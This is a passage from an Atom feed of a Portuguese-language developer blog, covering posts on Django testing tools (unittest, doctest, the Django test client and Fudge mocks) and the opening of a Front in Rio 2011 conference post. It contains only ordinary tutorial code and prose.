    &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;expects&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;UpdateStatus&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;with_arg_count&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="n"&gt;post_msg_to_twitter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;hey there fellow testing freaks!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pronto! Sabendo que valores serão passados, e quais os resultados,
podemos simular o comportamento daquele serviço. Prático, não?&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Estas são as ferramentas que eu costumo utilizar em meus projetos
&lt;em&gt;Python/Django&lt;/em&gt;. É claro que existem outras, na verdade existem várias.
Tenha em mente que a ferramenta é apenas um meio de garantir, através de
testes, que você está guiando a sua aplicação para o lugar certo. Os
testes automatizados no final servem para garantir que ela ainda segue
este caminho, que contribuições realizadas tardiamente não “quebraram” o
comportamento que você escreveu no início do desenvolvimento.&lt;/p&gt;
&lt;p&gt;Tenho a intenção de escrever um &lt;em&gt;post&lt;/em&gt; mais prático sobre testes e
&lt;em&gt;Django&lt;/em&gt;. Fiquem no aguardo ;)&lt;/p&gt;
&lt;p&gt;E você? Tem alguma ferramenta para recomendar? Utilize os comentários
abaixo para compartilhá-la.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://cilliano.com/blog/2011/02/07/django-bdd-with-lettuce-and-splinter/" title="Leia sobre Django, BDD, Lettuce e Splinter"&gt;&lt;em&gt;CillianO – Django Full Stack Testing and BDD with Lettuce and Splinter&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.dtsato.com/blog/work/introduzindo_desenvolvimento_orientado_comportamento_bdd/" title="Não sabe o que é BDD? Conheça neste artigo de Danilo Sato"&gt;&lt;em&gt;Danilo Sato&lt;/em&gt; – Introduzindo Desenvolvimento Orientado por Comportamento &lt;em&gt;BDD&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jbalogh/django-nose" title="Visite o repositório do django-nose no GitHub"&gt;&lt;em&gt;django-nose – GitHub repository&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://farmdev.com/projects/fudge/using-fudge.html#fudging-a-web-service" title="Documentação oficial do Fudge"&gt;&lt;em&gt;Fudge – Using Fudge&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://jpz-log.info/archives/2010/06/08/nose-testing-in-python-made-easy/" title="Testes em Python passam a ser mais fáceis com nose"&gt;&lt;em&gt;JPz’log – nose: Testing in Python made easy&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://somethingaboutorange.com/mrl/projects/nose/1.0.0/writing_tests.html" title="Aprenda a escrever testes Python com o Nose"&gt;&lt;em&gt;Nose – Writing tests&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://splinter.cobrateam.info/" title="Conheça o projeto Splinter, e envolva-se"&gt;&lt;em&gt;Splinter – Test framework for web applications&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="ambiente-de-desenvolvimento"></category><category term="python"></category><category term="django"></category><category term="bdd"></category><category term="tdd"></category><category term="testes"></category></entry><entry><title>Ferramentas de testes em Django - Parte 1</title><link href="https://klauslaube.com.br/2011/07/18/ferramentas-de-testes-em-django-parte-1.html" rel="alternate"></link><published>2011-07-18T22:06:00-03:00</published><updated>2011-07-18T22:06:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-07-18:/2011/07/18/ferramentas-de-testes-em-django-parte-1.html</id><summary type="html">&lt;p&gt;Dando continuidade à série
“&lt;a href="{filename}03-montando-seu-ambiente-de-desenvolvimento-django-no-linux.md" title="Veja outros posts desta série"&gt;Montando seu ambiente de desenvolvimento &lt;em&gt;Django&lt;/em&gt; no &lt;em&gt;Linux&lt;/em&gt;&lt;/a&gt;“, vou
indicar algumas ferramentas de testes para que você também possa deixar
com que os &lt;a href="https://klauslaube.com.br/2011/01/27/tdd-desenvolvimento-orientado-testes.html" title="TDD: Desenvolvimento Orientado a Testes"&gt;testes guiem o desenvolvimento de suas aplicações&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Afinal, testar é preciso ;)&lt;/p&gt;
&lt;h2&gt;Testar em Django é possível?&lt;/h2&gt;
&lt;p&gt;Sem dúvida nenhuma! Mas não espere que …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Dando continuidade à série
“&lt;a href="{filename}03-montando-seu-ambiente-de-desenvolvimento-django-no-linux.md" title="Veja outros posts desta série"&gt;Montando seu ambiente de desenvolvimento &lt;em&gt;Django&lt;/em&gt; no &lt;em&gt;Linux&lt;/em&gt;&lt;/a&gt;“, vou
indicar algumas ferramentas de testes para que você também possa deixar
com que os &lt;a href="https://klauslaube.com.br/2011/01/27/tdd-desenvolvimento-orientado-testes.html" title="TDD: Desenvolvimento Orientado a Testes"&gt;testes guiem o desenvolvimento de suas aplicações&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Afinal, testar é preciso ;)&lt;/p&gt;
&lt;h2&gt;Testar em Django é possível?&lt;/h2&gt;
&lt;p&gt;Sem dúvida nenhuma! Mas não espere que o &lt;em&gt;framework&lt;/em&gt; adeque-se a você,
você precisa ter a iniciativa de tentar compreender as melhores maneiras
para escrever testes em &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Por exemplo, se você tem por hábito isolar os modelos para &lt;a href="https://klauslaube.com.br/tag/testes.html" title="Leia mais sobre testes"&gt;testá-los&lt;/a&gt;
de forma unitária, pode passar por certa dor de cabeça com o
&lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; / &lt;em&gt;Django&lt;/em&gt;. Não que seja impossível, mas o comportamento
&lt;em&gt;default&lt;/em&gt; do &lt;em&gt;framework&lt;/em&gt; é criar uma base de dados “fake” para você não
precisar ter este trabalho.&lt;/p&gt;
&lt;p&gt;Enfim, talvez a forma de &lt;strong&gt;utilizar&lt;/strong&gt; estas ferramentas &lt;strong&gt;caiba em um
outro &lt;em&gt;post&lt;/em&gt;&lt;/strong&gt;, o objetivo deste é &lt;strong&gt;apenas apresentá-las&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;unittest – Testando unidades através de classes&lt;/h2&gt;
&lt;p&gt;A &lt;a href="http://docs.python.org/library/unittest.html" title="unittest — Unit testing framework"&gt;&lt;em&gt;unittest&lt;/em&gt;&lt;/a&gt; é uma biblioteca padrão do &lt;em&gt;Python&lt;/em&gt; que ajuda (e muito)
a escrever testes automatizados com a linguagem.&lt;/p&gt;
&lt;p&gt;Os testes são escritos através de classes, onde utilizamos os esquemas
de &lt;a href="http://docs.python.org/library/unittest.html#assert-methods" title="Veja a lista de asserts da unittest"&gt;&lt;em&gt;assertions&lt;/em&gt;&lt;/a&gt; para garantir o comportamento do código testado
(nenhuma novidade até aqui). Para quem utiliza testes unitários no
&lt;em&gt;Java&lt;/em&gt; não vai sentir grandes mudanças na abordagem, já que a &lt;em&gt;unittest&lt;/em&gt;
é inspirada na &lt;a href="http://javafree.uol.com.br/wiki/JUnit" title="Leia mais sobre a JUnit"&gt;&lt;em&gt;JUnit&lt;/em&gt;&lt;/a&gt; (sendo muitas vezes até chamada de &lt;em&gt;PyUnit&lt;/em&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;unittest&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;myapp.models&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Animal&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;AnimalTestCase&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;unittest&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;TestCase&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;setUp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;lion&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Animal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;lion&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sound&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;roar&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Animal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;cat&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sound&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;meow&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;testSpeaking&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertEquals&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;lion&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;speak&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;The lion says &amp;quot;roar&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertEquals&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;speak&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;The cat says &amp;quot;meow&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O &lt;em&gt;test runner&lt;/em&gt; padrão do &lt;em&gt;Django&lt;/em&gt; irá procurar por subclasses de
&lt;code&gt;unittest.TestCase&lt;/code&gt; nos arquivos &lt;code&gt;models.py&lt;/code&gt; e &lt;code&gt;tests.py&lt;/code&gt;. A suíte
de testes tenta facilitar ao máximo a sua vida… execute a seguinte
instrução e confira se a sua aplicação está &lt;em&gt;ok&lt;/em&gt; ou não:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python manage.py &lt;span class="nb"&gt;test&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Peraí que não acabou! Apresentando a TestCase&lt;/h3&gt;
&lt;p&gt;Testar aplicações &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;Web&lt;/em&gt;&lt;/a&gt; com a &lt;em&gt;unittest&lt;/em&gt; pode ser dureza. Pensando
nisso o &lt;em&gt;Django&lt;/em&gt; disponibiliza a &lt;code&gt;TestCase&lt;/code&gt;, que estende a &lt;em&gt;unittest&lt;/em&gt;
adicionando funcionalidades como carregamento de &lt;em&gt;fixtures&lt;/em&gt;, roteamento
de &lt;em&gt;urls&lt;/em&gt; e um &lt;em&gt;client&lt;/em&gt; para fazer requisições &lt;em&gt;Web&lt;/em&gt; e testar as suas
&lt;em&gt;views&lt;/em&gt; (o &lt;em&gt;TestClient&lt;/em&gt;, detalhado mais abaixo).&lt;/p&gt;
&lt;h2&gt;doctest – Testando através de docstrings&lt;/h2&gt;
&lt;p&gt;Admito que escrever documentação de &lt;em&gt;software&lt;/em&gt; não é o meu forte… mas
com &lt;em&gt;doctests&lt;/em&gt; pode-se documentar métodos ao mesmo tempo em que
escreve-se testes!&lt;/p&gt;
&lt;p&gt;A &lt;a href="http://docs.python.org/library/doctest.html" title="Leia mais sobre a doctest"&gt;&lt;em&gt;doctest&lt;/em&gt;&lt;/a&gt; é uma biblioteca padrão do &lt;em&gt;Python&lt;/em&gt; que procura e
interpreta &lt;a href="http://www.python.org/dev/peps/pep-0257/" title="Entenda o que é uma docstring"&gt;&lt;em&gt;docstrings&lt;/em&gt;&lt;/a&gt; na aplicação. A sintaxe nesses trechos de
&lt;em&gt;docstrings&lt;/em&gt; é diferenciada, simulando um interpretador interativo do
&lt;em&gt;Python&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# models.py&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.db&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Animal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Model&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;    An animal that knows how to make noise&lt;/span&gt;

&lt;span class="sd"&gt;    # Create some animals&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;gt;&amp;gt;&amp;gt; lion = Animal.objects.create(name=&amp;quot;lion&amp;quot;, sound=&amp;quot;roar&amp;quot;)&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;gt;&amp;gt;&amp;gt; cat = Animal.objects.create(name=&amp;quot;cat&amp;quot;, sound=&amp;quot;meow&amp;quot;)&lt;/span&gt;

&lt;span class="sd"&gt;    # Make &amp;#39;em speak&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;gt;&amp;gt;&amp;gt; lion.speak()&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;#39;The lion says &amp;quot;roar&amp;quot;&amp;#39;&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;gt;&amp;gt;&amp;gt; cat.speak()&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;#39;The cat says &amp;quot;meow&amp;quot;&amp;#39;&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;sound&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;speak&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;The &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt; says &amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sound&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Assim como com a &lt;em&gt;unittest&lt;/em&gt;, o &lt;em&gt;test runner&lt;/em&gt; padrão do &lt;em&gt;Django&lt;/em&gt;
procurará por ocorrências de &lt;em&gt;docstests&lt;/em&gt; em &lt;code&gt;models.py&lt;/code&gt; e
&lt;code&gt;tests.py&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Django Test Client – Testando a sua aplicação como se fosse um navegador&lt;/h2&gt;
&lt;p&gt;E como fazer para testar requisições &lt;em&gt;Web&lt;/em&gt;? Por exemplo, você não quer
testar a sua &lt;em&gt;view&lt;/em&gt; de forma isolada, quer testar desde a parte de
roteamento ao comportamento com o banco de dados, como se você se
estivesse realmente visitando a página. Neste caso entra a &lt;a href="https://docs.djangoproject.com/en/dev/topics/testing/#module-django.test.client" title="Testando aplicações Django com requisições Web falsas"&gt;&lt;em&gt;test
client&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Toda a classe &lt;code&gt;TestCase&lt;/code&gt; possui uma instância da &lt;strong&gt;Django Test
Client&lt;/strong&gt;. Então escrever testes com requisições à sua aplicação fica
muito simples utilizando classes:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.test&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;TestCase&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;SimpleTest&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;TestCase&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;test_details&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/customer/details/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertEqual&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;test_index&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/customer/index/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertEqual&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;É perfeitamente possível utilizar a &lt;strong&gt;test client&lt;/strong&gt; em &lt;em&gt;doctests&lt;/em&gt;
também:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;&amp;gt;&amp;gt;&amp;gt; from django.test.client import Client&lt;/span&gt;
&lt;span class="sd"&gt;&amp;gt;&amp;gt;&amp;gt; c = Client()&lt;/span&gt;
&lt;span class="sd"&gt;&amp;gt;&amp;gt;&amp;gt; response = c.post(&amp;#39;/login/&amp;#39;, {&amp;#39;username&amp;#39;: &amp;#39;john&amp;#39;,&lt;/span&gt;
&lt;span class="sd"&gt;...        &amp;#39;password&amp;#39;: &amp;#39;smith&amp;#39;})&lt;/span&gt;
&lt;span class="sd"&gt;&amp;gt;&amp;gt;&amp;gt; response.status_code&lt;/span&gt;
&lt;span class="sd"&gt;200&lt;/span&gt;
&lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Particularmente, tive a oportunidade de implementar testes unitários já
no início do meu aprendizado em &lt;em&gt;Django&lt;/em&gt;. Deixar os testes te guiarem é
uma prática excelente!&lt;/p&gt;
&lt;p&gt;Tudo parte do bom senso, óbvio. Nenhum processo ou ferramenta deveria
substituir o “feeling” do profissional… também não é muito sadio ser
extremamente “by the book“. Mas se puder utilizar testes para guiar o
seu desenvolvimento, use-os!&lt;/p&gt;
&lt;p&gt;Na segunda parte deste &lt;em&gt;post&lt;/em&gt; pretendo apresentar algumas ferramentas
que irão turbinar ainda mais o seu desenvolvimento orientado a testes.&lt;/p&gt;
&lt;p&gt;Até lá!&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/1.1/topics/testing/#writing-unit-tests" title="Leia direto da fonte como escrever testes em Django"&gt;&lt;em&gt;Django Documentation – Writing unit tests&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/1.1/topics/testing/#writing-doctests" title="Leia direto da fonte sobre como escrever testes com docstrings"&gt;&lt;em&gt;Django Documentation – Writing doctests&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/1.1/topics/testing/#testcase" title="Entenda a diferença entre unittest do Python e o TestCase do Django"&gt;&lt;em&gt;Django Documentation – TestCase&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.python.org/library/unittest.html" title="Leia sobre a unittest direto da documentação do Python"&gt;&lt;em&gt;Python Documentation – unittest: Unit testing framework&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://dougalmatthews.com/articles/2010/jan/20/testing-your-first-django-app/" title="Aprenda a testar a sua primeira aplicação em Django"&gt;&lt;em&gt;Dougal Matthews – Testing your first Django app&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://kokoko.fluxionary.net/testing-django-part-1-nose" title="O Konrad apresenta algumas ferramentas muito boas para testes com Django"&gt;&lt;em&gt;Konrad’s Kode, Konfigs &amp;amp; Konstructions – Testing Django&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.marinhobrandao.com/blog/programacao-dirigida-a-testes-no-django/" title="Aprenda Django de uma forma divertida com o Marinho"&gt;&lt;em&gt;Marinho Brandão&lt;/em&gt; – Programação dirigida a testes no &lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="ambiente-de-desenvolvimento"></category><category term="python"></category><category term="django"></category><category term="testes"></category><category term="bdd"></category><category term="tdd"></category></entry><entry><title>Front in Rio 2011 - Eu fui!</title><link href="https://klauslaube.com.br/2011/06/19/front-in-rio-2011-eu-fui.html" rel="alternate"></link><published>2011-06-19T21:24:00-03:00</published><updated>2011-06-19T21:24:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-06-19:/2011/06/19/front-in-rio-2011-eu-fui.html</id><summary type="html">&lt;p&gt;Enquanto as minhas esperanças de ir para o &lt;a href="http://www.rockinrio.com.br/pt/ingressos/" title="Rock in Rio 2011 - Ingressos esgotados"&gt;&lt;em&gt;Rock in Rio&lt;/em&gt;&lt;/a&gt; deste ano
acabaram, não pude deixar de acompanhar meus colegas &lt;a href="http://twitter.com/#!/romulojales" title="Acompanhe o bom humor do Rômulo Jales"&gt;&lt;em&gt;@romulojales&lt;/em&gt;&lt;/a&gt;,
&lt;a href="http://twitter.com/#!/kenjiyamamoto" title="Novidades tecnológicas são com ele!"&gt;&lt;em&gt;@kenjiyamamoto&lt;/em&gt;&lt;/a&gt; e &lt;a href="http://twitter.com/#!/davidsonFellipe" title="Davidson fala muito sobre front-end em seu Twitter"&gt;&lt;em&gt;@davidsonFellipe&lt;/em&gt;&lt;/a&gt; na edição do &lt;a href="http://www.frontinrio.com.br/" title="Página oficial do evento"&gt;&lt;em&gt;Front in Rio 2011&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;É o primeiro evento que participo como funcionário da &lt;a href="http://globo.com/" title="Absolutamente tudo sobre notícias, entretenimento e esportes"&gt;&lt;em&gt;Globo.com&lt;/em&gt;&lt;/a&gt;, e
devo confessar que é também o …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Enquanto as minhas esperanças de ir para o &lt;a href="http://www.rockinrio.com.br/pt/ingressos/" title="Rock in Rio 2011 - Ingressos esgotados"&gt;&lt;em&gt;Rock in Rio&lt;/em&gt;&lt;/a&gt; deste ano
